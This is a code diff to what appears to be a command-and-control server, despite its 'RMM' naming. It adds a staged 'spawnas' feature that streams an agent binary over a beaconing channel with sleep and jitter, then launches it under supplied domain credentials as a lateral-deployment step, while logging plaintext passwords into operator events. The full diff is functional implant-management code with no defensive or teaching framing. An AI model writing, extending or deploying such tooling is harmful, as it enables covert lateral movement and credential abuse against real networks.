@@ -162,6 +162,12 @@ _LATERAL_DEPLOYMENT_INIT_LOCK = threading.Lock()
 # Spawnas / runas: spawn or run a command under a different process identity.
 # The Go agent answers __SPAWNAS__ with "spawned session=<id> pid=<pid> identity=<label>".
 SPAWNAS_COMMAND = "__SPAWNAS__"
+# Staged spawnas deploys the server-selected workspace agent build under the
+# requested identity. The new wire name is deliberate: older agents must
+# reject the request instead of ignoring the staging fields and relaunching
+# their own image (which names the PowerShell host from a memory-hosted
+# session). The reply contract is identical to the legacy command's.
+SPAWNAS_STAGED_COMMAND = "__SPAWNAS_STAGED__"
 SPAWNAS_RESULT_RE = re.compile(r"session=(?P<session_id>[A-Za-z0-9_-]{8,128})\s+pid=(?P<pid>\d+)")
 RUNAS_COMMAND = "__RUNAS__"
 STAGING_TTL_SECONDS = 600
@@ -3379,7 +3385,12 @@ class RMMServer:
                 verify=True, spawn_timeout=120.0, register_timeout=60.0, verify_timeout=120.0):
         """Spawn under a different identity, inheriting a debug source build.
 
-        Credentials are resolved server-side and retained in operator events.
+        The deployment streams the server-selected, workspace-owned agent
+        build through the single-use staging endpoint instead of relaunching
+        the source binary, so a memory-hosted source session can run it; the
+        spawned child is a full on-disk agent session under the explicit
+        credentials. Credentials are resolved server-side and retained in
+        operator events.
         """
         session = self.resolve_session(session_id_or_prefix)
         if not session:
@@ -3393,15 +3404,39 @@ class RMMServer:
             domain, user = (p.strip() for p in user.split("\\", 1))
         if not user:
             return None, "invalid_credentials"
+        # Stage the workspace-owned agent build the way every lateral method
+        # does: the source agent fetches it masked over its own beacon
+        # channel, so its hosting mode stops determining which binary runs.
+        owner = getattr(session, "workspace_id", None) or ""
+        agent_binary = (latest_go_agent_binary(debug=True, workspace_id=owner) if debug
+                        else latest_go_agent_binary(workspace_id=owner))
+        if not agent_binary:
+            return None, "debug_payload_unavailable" if debug else "agent_payload_unavailable"
+        try:
+            with open(agent_binary, "rb") as handle:
+                artifact = handle.read()
+        except OSError as exc:
+            self.log(f"Reading the agent payload for staging failed: {exc}", "WARNING")
+            return None, "debug_payload_unavailable" if debug else "agent_payload_unavailable"
+        payload_sha256 = hashlib.sha256(artifact).hexdigest()
+        stage_id = self.create_staging(artifact)
+        # Reserve beacon-delivery time inside the agent's worker budget, the
+        # same allowance the lateral chain applies to staged fetches.
+        worker_timeout = float(spawn_timeout)
+        delivery_budget = float(getattr(session, "sleep_seconds", 60)) * (
+            1 + float(getattr(session, "jitter_percent", 30)) / 100) + 15
+        worker_timeout -= min(delivery_budget, worker_timeout / 2)
         spawned_id = self._new_deployment_id("spawnas")
         identity = self._identity_label(domain, user)
-        command = SPAWNAS_COMMAND + "\n" + json.dumps(
+        command = SPAWNAS_STAGED_COMMAND + "\n" + json.dumps(
             {"session_id": spawned_id,
              "workspace_id": getattr(session, "workspace_id", None) or "",
-             "domain": domain, "user": user, "password": password or ""},
+             "domain": domain, "user": user, "password": password or "",
+             "stage": stage_id, "payload_sha256": payload_sha256,
+             "timeout_seconds": worker_timeout},
             separators=(",", ":"),
         )
-        self.record_operator_action(session, f"{SPAWNAS_COMMAND} {identity} {json.dumps(password or '', ensure_ascii=False)}", "spawnas")
+        self.record_operator_action(session, f"{SPAWNAS_STAGED_COMMAND} {identity} {json.dumps(password or '', ensure_ascii=False)}", "spawnas")
         event, status = self.exec_and_wait(session.id, command, timeout=spawn_timeout)
         if status not in ("ok", "timeout"):
             return None, status
@@ -3417,6 +3452,7 @@ class RMMServer:
             "spawn_output": output,
             "launch_status": "acknowledged" if acknowledged else "inconclusive",
             "submission_status": status,
+            "stage_status": self.staging_status(stage_id),
         }
         return self._verify_deployment(session, spawned_id, payload, verify, register_timeout)
 
@@ -6187,12 +6223,18 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(409, {"error": status})
             elif status == "invalid_credentials":
                 self._json(400, {"error": status})
+            elif status == "agent_payload_unavailable":
+                self._json(503, {"error": status,
+                                 "detail": "No Windows agent build is staged on the server for this workspace; run build_go_agent first."})
+            elif status == "debug_payload_unavailable":
+                self._json(503, {"error": status,
+                                 "detail": "No readable Windows amd64 debug agent is available; build the separate debug artifact first."})
             elif status == "session_killed":
                 self._json(410, {"error": status})
             elif status == "server_stopped":
                 self._json(503, {"error": status})
             elif status == "timeout":
-                self._json(408, {"error": status, "command": SPAWNAS_COMMAND})
+                self._json(408, {"error": status, "command": SPAWNAS_STAGED_COMMAND})
             else:
                 self._json(200, result)
             return True
